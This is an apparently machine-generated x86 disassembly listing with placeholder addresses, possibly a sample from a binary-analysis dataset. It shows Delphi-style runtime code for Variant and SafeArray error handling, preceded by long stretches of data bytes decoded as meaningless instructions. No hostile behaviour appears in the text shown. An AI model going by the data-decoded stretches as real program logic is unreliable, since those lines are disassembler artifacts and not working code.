jns r-xdata
inc ecx
jb r-xdata
insb
outsd
ja r-xdata
add [ eax + 0x15004033 ] al
inc ebp
push esi
popad
jb r-xdata
inc eax
jns r-xdata
jbe r-xdata
popad
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
inc eax
add [ ebx + esi + 0x40 ] al
add [ eax + 0x15004033 ] al
inc ebp
push esi
popad
jb r-xdata
add al bl
xor eax 0x35e40040
inc eax
add al ch
xor eax 0x35ec0040
inc eax
jo r-xdata
popad
outsb
je r-xdata
inc eax
add [ eax + eax ] cl
add [ eax ] al
pop esp
jl r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
and al 0xe9
nop
shr al 0x40
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al al
call 0x4ce8da
add [ eax ] al
pop esp
jl r-xdata
outsd
jb r-xdata
inc ebp
jb r-xdata
add [ eax ] ch
jb r-xdata
in al dx
jmp r-xdata
inc ebx
popad
insb
imul esp [ ecx + eax * 2 + 0x72 ] 0x72724567
xor eax [ eax ]
inc esp
xor eax [ eax ]
xor [ ebx ] 0x40
add [ edi ] dl
jbe r-xdata
popad
jae r-xdata
inc ebx
add al ah
xor eax 0x33280040
outsb
jbe r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + ebp * 8 ] ah
add al bl
xor eax 0x35e40040
inc eax
add al ch
xor eax 0x35ec0040
inc eax
add al ah
xor eax 0x33280040
inc eax
add [ ebx + esi + 0x40 ] al
add [ eax + 0x16004033 ] al
inc ebp
push esi
popad
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x16 ] dl
inc eax
add [ eax + eax ] cl
add [ eax ] al
pop esp
jl r-xdata
0x40 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov ah 0xea
inc eax
add [ eax + eax ] cl
outsd
jb r-xdata
push esi
popad
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push eax
0xc0040 0x0
outsd
jb r-xdata
inc ebp
push esi
popad
jb r-xdata
inc eax
add [ eax + 0x17004033 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah ch
inc ebp
jb r-xdata
adc eax 0x72615645
jns r-xdata
popad
jb r-xdata
imul esp [ ecx + 0x6e ] 0x64614274
push esi
0x40 0x0
jb r-xdata
jb r-xdata
insb
imul esp [ edi + ecx * 2 + 0x70 ] 0x6f727245
add [ eax ] al
pop esp
jl r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + ebp * 8 + 0xc0040 ] dh
add al bl
xor eax 0x35e40040
inc eax
add al ch
xor eax 0x35ec0040
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] bl
jmp r-xdata
add al bl
xor eax 0x35e40040
inc eax
add al ch
xor eax 0x35ec0040
inc eax
add al ah
xor eax 0x33280040
inc eax
add [ ebx + esi + 0x40 ] al
add [ eax + 0x15004033 ] al
inc ebp
push esi
popad
jb r-xdata
add al ah
xor eax 0x33280040
inc eax
add [ ebx + esi + 0x40 ] al
add [ eax + 0x17004033 ] al
inc ebp
push esi
popad
jb r-xdata
outsb
shr ah 0xe9
inc eax
add [ eax ] al
add [ eax ] al
jmp 0x4cea06
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
in al dx
outsd
jb r-xdata
add [ eax ] ch
xor eax [ eax ]
inc esp
xor eax [ eax ]
xor [ ebx ] 0x40
add [ eax ] bl
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc ebp
jb r-xdata
outsb
js r-xdata
dec ecx
popad
outsb
je r-xdata
outsd
jb r-xdata
jb r-xdata
popad
outsb
je r-xdata
ror [ eax + 0x40e9 ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov cl ch
inc eax
add [ eax + eax ] cl
add [ eax ] al
pop esp
jl r-xdata
outsb
je r-xdata
popad
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sub bl 0x40
add [ eax + eax ] cl
add [ eax ] al
pop esp
jl r-xdata
outsd
jb r-xdata
add [ eax ] al
inc ebp
push esi
popad
jb r-xdata
add al bl
xor eax 0x35e40040
inc eax
add al ch
xor eax 0x35ec0040
inc eax
add al ah
xor eax 0x33280040
inc eax
add [ ebx + esi + 0x40 ] al
add [ eax + 0x18004033 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sbb bl ch
inc eax
add [ eax + eax ] cl
add [ eax ] al
pop esp
jl r-xdata
imul esp [ ecx + 0x6e ] 0x64614274
dec ecx
call 0xffffffffec412ad6
xor eax 0x35e00040
inc eax
add [ eax ] ch
xor eax [ eax ]
inc esp
xor eax [ eax ]
xor [ ebx ] 0x40
add [ 0x72615645 ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0xc0040eb ] al
add [ eax ] al
add [ esp + edi * 2 + 0x40 ] bl
inc eax
add [ eax + 0x40eb ] al
popad
jns r-xdata
call 0xffffffffec412b3a
xor eax 0x35e00040
inc eax
popad
add [ eax ] al
add al bl
xor eax 0x35e40040
inc eax
add al ch
xor eax 0x35ec0040
inc eax
add al ah
xor eax 0x33280040
inc eax
add [ ebx + esi + 0x40 ] al
add ah ah
xor eax 0x35e80040
jb r-xdata
inc ebp
push esi
popad
jb r-xdata
add ah ah
xor eax 0x35e80040
inc eax
add ah ch
xor eax 0x35e00040
inc eax
jb r-xdata
add [ eax ] al
add al bl
xor eax 0x35e40040
inc eax
add al ch
xor eax 0x35ec0040
inc eax
add al ah
xor eax 0x33280040
inc eax
add [ ebx + esi + 0x40 ] al
add [ eax + 0x18004033 ] al
rcr [ eax ] 0xeb
inc eax
add [ eax ] al
add [ eax ] al
outsb
je r-xdata
add [ eax ] ch
xor eax [ eax ]
inc esp
xor eax [ eax ]
xor [ ebx ] 0x40
add [ eax ] bl
outsd
arpl [ ebx + 0x65 ] bp
inc ebp
jb r-xdata
sub [ ebx ] dh
outsd
inc eax
popad
jb r-xdata
popad
add [ esp + ebp * 8 + 0x40 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al ch
jmp r-xdata
outsb
je r-xdata
popad
outsb
je r-xdata
inc ebp
push esi
popad
jb r-xdata
inc eax
add [ eax ] ch
xor eax [ eax ]
inc esp
xor eax [ eax ]
xor [ ebx ] 0x40
add [ eax ] bl
insd
add [ eax ] al
inc eax
add [ ebx + esi + 0x40 ] al
add [ eax + 0x18004033 ] al
add al bl
xor eax 0x35e40040
inc eax
add al ch
xor eax 0x35ec0040
inc eax
add al ah
xor eax 0x33280040
inc eax
add ah ch
xor eax 0x35e00040
inc eax
add [ eax ] ch
xor eax [ eax ]
inc esp
xor eax [ eax ]
xor [ ebx ] 0x40
add [ eax * 2 + 0x69726156 ] dl
jb r-xdata
add [ eax ] al
jb r-xdata
add [ eax + 0x15004033 ] al
inc ebp
push esi
popad
jb r-xdata
outsb
js r-xdata
xor eax 0x33280040
jne r-xdata
jb r-xdata
inc ebp
add [ eax ] al
add al bl
xor eax 0x35e40040
inc eax
add al ch
xor eax 0x35ec0040
inc eax
add al ah
jo r-xdata
popad
je r-xdata
inc eax
add al ch
jmp r-xdata
jbe r-xdata
popad
outsb
je r-xdata
inc eax
add [ eax ] al
add [ eax ] al
arpl [ gs : ebp + 0x64 ] si
inc ebp
jb r-xdata
jae r-xdata
popad
sbb ch ch
dec edi
je r-xdata
add [ eax ] al
pop esp
jl r-xdata
inc eax
add [ esp + ebp * 8 + 0x40 ] dh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov ah 0xec
inc eax
add [ eax + eax ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + ebp * 8 + 0xc0040 ] dh
outsd
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al bl
xor eax 0x35e40040
inc eax
add al ch
xor eax 0x35ec0040
inc eax
add al ah
xor eax 0x33280040
inc eax
add [ ebx + esi + 0x40 ] al
jb r-xdata
inc ebp
jb r-xdata
add [ ebx + esi + 0x40 ] al
add [ eax + 0x14004033 ] al
inc ebp
push esi
popad
jb r-xdata
pop ebp
insb
imul esp [ esi + ecx * 2 + 0x75 ] 0x704f6c6c
inc ebp
inc eax
add ah ch
xor eax 0x35e00040
inc eax
add [ eax ] ch
xor eax [ eax ]
inc esp
xor eax [ eax ]
xor [ ebx ] 0x40
add [ edx ] bl
imul esi [ ebx + 0x70 ] 0x68637461
inc ebp
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jl r-xdata
inc ebp
push esi
popad
jb r-xdata
inc eax
add al bl
xor eax 0x35e40040
inc eax
add al ch
xor eax 0x35ec0040
inc eax
add al ah
xor eax 0x33280040
inc eax
add [ ebx + esi + 0x40 ] al
add [ eax + 0x1a004033 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
outsd
jb r-xdata
outsd
jb r-xdata
popad
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc ebp
jb r-xdata
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + ebp * 8 + 0x40 ] cl
add [ eax + eax ] cl
add [ eax ] al
pop esp
jl r-xdata
outsd
je r-xdata
popad
jpo r-xdata
retn
popad
outsb
je r-xdata
rcl [ ebp + 0x68 ] 0xe2
in eax dx
inc eax
add [ edi + edi * 8 + 0x30 ] ah
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_406030
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bc44
call sub_403b5c
xor eax eax
pop edx
outsd
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebp + ebp * 8 + 0x40 ] bh
add [ eax + eax ] cl
add [ eax ] al
je r-xdata
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] bl
in eax dx
inc eax
add [ eax + eax ] cl
add [ eax ] al
pop esp
jl r-xdata
inc eax
add [ eax ] al
add [ eax ] al
in eax dx
jb r-xdata
push 0x6f727245
dec esi
jne r-xdata
add [ eax ] al
add [ eax ] al
outsd
jns r-xdata
inc eax
add [ ebx + esi + 0x40 ] al
add [ eax + 0x17004033 ] al
inc ebp
push esi
popad
jb r-xdata
sub [ ebx ] dh
dec bp
insd
outsd
jb r-xdata
dec ebp
in al dx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x1c ] ecx
mov esi edx
mov ebx eax
mov [ fs : eax ] esp
lea edx [ ebp - 0x14 ]
mov eax ebx
call sub_414a3c
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea edx [ ebp - 0x18 ]
mov eax esi
call sub_414a3c
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x10 ]
push eax
push 0x1
lea edx [ ebp - 0x1c ]
mov eax [ rw-data ]
call sub_406030
mov ecx [ ebp - 0x1c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bc80
call sub_403b5c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40ee82
lea eax [ ebp - 0x1c ]
mov edx 0x3
call sub_404144
retn
inc eax
add [ edi + edi * 8 + 0x30 ] ah
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40ede9
lea eax [ ebp - 0x4 ]
call sub_404120
retn
outsb
sar [ ebp + ebp * 8 + 0x40 ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
xor eax eax
push ebp
push sub_40ee7b
push [ fs : eax ]
call 0xffffffff8c253b89
mov ebx eax
insb
dec edi
jo r-xdata
add [ ebp + 0x3fe8fc45 ] cl
push ebx
jb r-xdata
sub_40ed98
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push sub_40ede2
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_406030
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bc44
call sub_403b5c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40ede9
lea eax [ ebp - 0x4 ]
call sub_404120
retn
sub_40edec
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x1c ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_40ee7b
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x14 ]
mov eax ebx
call sub_414a3c
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea edx [ ebp - 0x18 ]
mov eax esi
call sub_414a3c
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x10 ]
push eax
push 0x1
lea edx [ ebp - 0x1c ]
mov eax [ rw-data ]
call sub_406030
mov ecx [ ebp - 0x1c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bc80
call sub_403b5c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40ee82
lea eax [ ebp - 0x1c ]
mov edx 0x3
call sub_404144
retn
sub_40ee88
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push sub_40eed2
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_406030
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bc44
call sub_403b5c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40eed9
lea eax [ ebp - 0x4 ]
call sub_404120
retn
sub_40eedc
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push sub_40ef26
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_406030
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bc44
call sub_403b5c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40ef2d
lea eax [ ebp - 0x4 ]
call sub_404120
retn
sub_40ef30
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x1c ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_40efbf
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x14 ]
mov eax ebx
call sub_414a3c
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea edx [ ebp - 0x18 ]
mov eax esi
call sub_414a3c
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x10 ]
push eax
push 0x1
lea edx [ ebp - 0x1c ]
mov eax [ rw-data ]
call sub_406030
mov ecx [ ebp - 0x1c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bc80
call sub_403b5c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40efc6
lea eax [ ebp - 0x1c ]
mov edx 0x3
call sub_404144
retn
sub_40efcc
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push sub_40f016
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_406030
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bc44
call sub_403b5c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40f01d
lea eax [ ebp - 0x4 ]
call sub_404120
retn
sub_40f020
push ebp
mov ebp esp
mov ecx 0x8
push 0x0
push 0x0
dec ecx
jne r-xdata
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_40f265
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
cmp eax 0x8002000a
jg r-xdata
sub eax 0x8002000b
je r-xdata
je r-xdata
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_406030
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bc44
call sub_403b5c
jmp r-xdata
sub eax 0x2
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_406030
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bc44
call sub_403b5c
jmp r-xdata
cmp eax 0x80020005
jg r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40f26c
lea eax [ ebp - 0x40 ]
mov edx 0x2
call sub_404144
lea eax [ ebp - 0x20 ]
mov edx 0x8
call sub_404144
retn
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_406030
mov ecx [ ebp - 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bc44
call sub_403b5c
jmp r-xdata
sub eax 0x50001
je r-xdata
sub eax 0x80020008
je r-xdata
je r-xdata
lea edx [ ebp - 0x18 ]
mov eax [ rw-data ]
call sub_406030
mov ecx [ ebp - 0x18 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bc44
call sub_403b5c
jmp r-xdata
sub eax 0x49
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_406030
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bc44
call sub_403b5c
jmp r-xdata
dec eax
je r-xdata
call sub_40ed98
jmp r-xdata
sub eax 0x80004001
je r-xdata
lea edx [ ebp - 0x1c ]
mov eax [ rw-data ]
call sub_406030
mov ecx [ ebp - 0x1c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bc44
call sub_403b5c
jmp r-xdata
jmp r-xdata
call sub_40ee88
jmp r-xdata
jmp r-xdata
lea edx [ ebp - 0x14 ]
mov eax [ rw-data ]
call sub_406030
mov ecx [ ebp - 0x14 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bc44
call sub_403b5c
jmp r-xdata
sub eax 0xbffe
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov [ ebp - 0x38 ] eax
mov [ ebp - 0x34 ] 0xb
mov [ ebp - 0x30 ] ebx
mov [ ebp - 0x2c ] 0x0
lea edx [ ebp - 0x3c ]
mov eax ebx
call sub_40b430
mov eax [ ebp - 0x3c ]
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x24 ] 0xb
lea eax [ ebp - 0x38 ]
push eax
push 0x2
lea edx [ ebp - 0x40 ]
mov eax [ rw-data ]
call sub_406030
mov ecx [ ebp - 0x40 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bc80
call sub_403b5c
lea edx [ ebp - 0x20 ]
mov eax [ rw-data ]
call sub_406030
mov ecx [ ebp - 0x20 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bc44
call sub_403b5c
jmp r-xdata
jmp r-xdata
sub_40f280
push ebx
test eax eax
je r-xdata
pop ebx
retn
mov ebx eax
sub ebx 0x80020005
je r-xdata
mov eax edx
mov edx ecx
call sub_40edec
jmp r-xdata
sub ebx 0x5
je r-xdata
mov eax edx
mov edx ecx
call sub_40ef30
jmp r-xdata
jmp r-xdata
call sub_40f020
sub_40f2b4
push ebx
push esi
mov esi edx
mov ebx eax
call sub_402844
mov edx [ r-xdata ]
call sub_40351c
test al al
je r-xdata
call sub_402844
mov edx [ r-xdata ]
call sub_40351c
test al al
je r-xdata
mov ecx esi
mov edx ebx
mov eax 0x8002000a
call sub_40f280
pop esi
pop ebx
retn
call sub_402844
mov edx [ r-xdata ]
call sub_40351c
test al al
je r-xdata
mov ecx esi
mov edx ebx
mov eax 0x8002000a
call sub_40f280
jmp r-xdata
call sub_402884
mov edx eax
mov eax edx
call sub_403b5c
mov ecx esi
mov edx ebx
mov eax 0x80020005
call sub_40f280
jmp r-xdata
pop esi
pop ebx
retn
sub_40f338
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push sub_40f382
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_406030
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bc44
call sub_403b5c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40f389
lea eax [ ebp - 0x4 ]
call sub_404120
retn
sub_40f3a0
push ebp
mov ebp esp
push ebx
mov ecx [ ebp + 0x8 ]
add ecx 0xfffffd00
mov eax edx
pop ebx
pop ebp
retn
test eax eax
jge r-xdata
mov edx [ ecx + eax * 8 + 0x4 ]
add edx [ ecx + eax * 8 ]
mov ebx [ ebp + 0x8 ]
cmp edx [ ebx + eax * 4 - 0x100 ]
setg dl
dec eax
test dl dl
je r-xdata
sub_40f3d0
push ebp
mov ebp esp
push ebx
push esi
mov dl 0x1
mov ecx [ ebp + 0x8 ]
inc [ ecx + eax * 4 - 0x100 ]
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx + eax * 8 - 0x2fc ]
mov ebx ecx
mov esi [ ebp + 0x8 ]
add ebx [ esi + eax * 8 - 0x300 ]
mov esi [ ebp + 0x8 ]
cmp ebx [ esi + eax * 4 - 0x100 ]
jg r-xdata
mov eax edx
pop esi
pop ebx
pop ebp
retn
test eax eax
jne r-xdata
mov edx [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
mov [ edx + eax * 4 - 0x100 ] ecx
mov edx [ ebp + 0x8 ]
push edx
dec eax
call sub_40f3d0
pop ecx
mov edx eax
xor edx edx
jmp r-xdata
sub_40f42c
push ebp
mov ebp esp
add esp 0xfffffce8
push ebx
push esi
push edi
mov [ ebp - 0x304 ] eax
mov eax [ ebp - 0x304 ]
test [ eax + 0x1 ] 0x20
jne r-xdata
mov eax [ ebp - 0x304 ]
mov ax [ eax ]
mov edx eax
and dx 0xfff
cmp dx 0xc
jne r-xdata
mov eax 0x80070057
call sub_40f274
mov eax [ ebp - 0x304 ]
push eax
call VariantClear
call sub_40f274
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x304 ]
test ah 0x40
je r-xdata
mov eax [ ebp - 0x304 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x308 ] eax
mov eax [ ebp - 0x304 ]
mov eax [ eax + 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x308 ] eax
jmp r-xdata
mov ebx [ ebp - 0x310 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor edi edi
lea esi [ ebp - 0x300 ]
mov eax [ ebp - 0x308 ]
movzx eax [ eax ]
mov [ ebp - 0x310 ] eax
mov ebx [ ebp - 0x310 ]
dec ebx
test ebx ebx
jl r-xdata
push ebp
mov ebx [ ebp - 0x310 ]
dec ebx
mov eax ebx
call sub_40f3a0
pop ecx
test al al
je r-xdata
inc ebx
lea eax [ ebp - 0x2fc ]
lea edx [ ebp - 0x100 ]
mov eax esi
mov [ ebp - 0x318 ] eax
mov eax [ ebp - 0x318 ]
add eax 0x4
push eax
lea eax [ edi + 0x1 ]
push eax
mov eax [ ebp - 0x308 ]
push eax
call SafeArrayGetLBound
call sub_40f274
lea eax [ ebp - 0x30c ]
push eax
lea eax [ edi + 0x1 ]
push eax
mov eax [ ebp - 0x308 ]
push eax
call SafeArrayGetUBound
call sub_40f274
mov eax [ ebp - 0x318 ]
mov edx [ ebp - 0x30c ]
sub edx [ eax + 0x4 ]
inc edx
mov eax [ ebp - 0x318 ]
mov [ eax ] edx
inc edi
add esi 0x8
dec ebx
jne r-xdata
push ebp
mov eax ebx
call sub_40f3d0
pop ecx
test al al
jne r-xdata
lea eax [ ebp - 0x314 ]
push eax
lea eax [ ebp - 0x100 ]
push eax
mov eax [ ebp - 0x308 ]
push eax
call SafeArrayPtrOfIndex
call sub_40f274
mov eax [ ebp - 0x314 ]
call sub_40f624
mov ecx [ eax ]
mov [ edx ] ecx
add edx 0x4
add eax 0x8
dec ebx
jne r-xdata
sub_40f5a8
push ebx
push esi
push ecx
mov ebx eax
mov si [ ebx ]
cmp si 0x14
jae r-xdata
cmp si 0x100
jne r-xdata
push ebx
call VariantClear
call sub_40f274
jmp r-xdata
cmp si 0x101
jne r-xdata
mov [ ebx ] 0x0
lea eax [ ebx + 0x8 ]
call sub_404120
jmp r-xdata
pop edx
pop esi
pop ebx
retn
test si 0x2000
je r-xdata
mov eax ebx
call [ rw-data ]
jmp r-xdata
mov edx esp
mov eax esi
call sub_41670c
test al al
je r-xdata
mov eax ebx
call sub_40f42c
jmp r-xdata
push ebx
call VariantClear
call sub_40f274
mov edx ebx
mov eax [ esp ]
mov ecx [ eax ]
call [ ecx + 0x24 ]
jmp r-xdata
sub_40f640
push ebp
mov ebp esp
push ebx
mov ecx [ ebp + 0x8 ]
add ecx 0xfffffd00
mov eax edx
pop ebx
pop ebp
retn
test eax eax
jge r-xdata
mov edx [ ecx + eax * 8 + 0x4 ]
add edx [ ecx + eax * 8 ]
mov ebx [ ebp + 0x8 ]
cmp edx [ ebx + eax * 4 - 0x100 ]
setg dl
dec eax
test dl dl
je r-xdata
sub_40f670
push ebp
mov ebp esp
push ebx
push esi
mov dl 0x1
mov ecx [ ebp + 0x8 ]
inc [ ecx + eax * 4 - 0x100 ]
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx + eax * 8 - 0x2fc ]
mov ebx ecx
mov esi [ ebp + 0x8 ]
add ebx [ esi + eax * 8 - 0x300 ]
mov esi [ ebp + 0x8 ]
cmp ebx [ esi + eax * 4 - 0x100 ]
jg r-xdata
mov eax edx
pop esi
pop ebx
pop ebp
retn
test eax eax
jne r-xdata
mov edx [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
mov [ edx + eax * 4 - 0x100 ] ecx
mov edx [ ebp + 0x8 ]
push edx
dec eax
call sub_40f670
pop ecx
mov edx eax
xor edx edx
jmp r-xdata
sub_40f6cc
push ebp
mov ebp esp
add esp 0xfffffce0
push ebx
push esi
push edi
mov [ ebp - 0x308 ] ecx
mov ebx edx
mov [ ebp - 0x304 ] eax
test [ ebx + 0x1 ] 0x20
jne r-xdata
mov ax [ ebx ]
mov edx eax
and dx 0xfff
cmp dx 0xc
jne r-xdata
mov eax 0x80070057
call sub_40f274
push ebx
mov eax [ ebp - 0x304 ]
push eax
call VariantCopy
call sub_40f274
test ah 0x40
je r-xdata
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x314 ] eax
